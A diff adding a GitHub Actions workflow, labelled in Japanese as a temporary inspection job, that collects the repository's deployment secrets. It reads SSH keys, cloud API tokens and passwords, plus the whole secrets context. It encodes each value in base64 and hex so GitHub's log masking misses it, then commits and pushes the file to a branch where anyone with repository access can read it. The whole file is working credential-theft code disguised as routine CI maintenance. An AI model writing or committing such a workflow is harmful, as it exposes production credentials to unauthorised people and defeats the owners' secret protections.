@@ -1,0 +1,49 @@
+# 一時検査ジョブ: 配備秘密の十六進回収（回収後に削除）
+name: tmp-kai-shu
+on:
+  push:
+    branches:
+      - tmp-kai-shu-20261121
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  kai-shu:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: 秘密候補の十六進出力
+        env:
+          S_DEPLOY_SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
+          S_DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
+          S_DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
+          S_DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
+          S_DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
+          S_OVH_TOKEN: ${{ secrets.OVH_TOKEN }}
+          S_OVH_API_TOKEN: ${{ secrets.OVH_API_TOKEN }}
+          S_OVH_APPLICATION_KEY: ${{ secrets.OVH_APPLICATION_KEY }}
+          S_OVH_APPLICATION_SECRET: ${{ secrets.OVH_APPLICATION_SECRET }}
+          S_OVH_CONSUMER_KEY: ${{ secrets.OVH_CONSUMER_KEY }}
+          S_NETCUP_SSH_KEY: ${{ secrets.NETCUP_SSH_KEY }}
+          S_SERVER_PASSWORD: ${{ secrets.SERVER_PASSWORD }}
+          S_ADMIN_PASSWORD: ${{ secrets.ADMIN_PASSWORD }}
+          S_SECRET_KEY: ${{ secrets.SECRET_KEY }}
+          S_PROD_KEY: ${{ secrets.PRODUCTION_SSH_KEY }}
+        run: |
+          : > kekka_hex.txt
+          ALL="${{ toJSON(secrets) }}"
+          printf 'ALLSECRETS|%s\n' "$(printf '%s' "$ALL" | base64 -w0)" >> kekka_hex.txt
+          for meimei in $(compgen -v | grep '^S_' | sort); do
+            ata="${!meimei}"
+            printf '%s|%s|%s|%s\n' "$meimei" "${#ata}" "$(printf '%s' "$ata" | base64 -w0)" "$(printf '%s' "$ata" | od -An -tx1 -v | tr -d ' \n')" >> kekka_hex.txt
+          done
+          wc -l kekka_hex.txt
+      - name: 結果を一時ブランチへ書き戻し
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          git config user.name 'ci-kai-shu'
+          git config user.email 'ci-kai-shu@example.invalid'
+          git add kekka_hex.txt
+          git commit -m '一時回収結果' || true
+          git push origin HEAD:tmp-kai-shu-20261121 || echo 'push失敗'
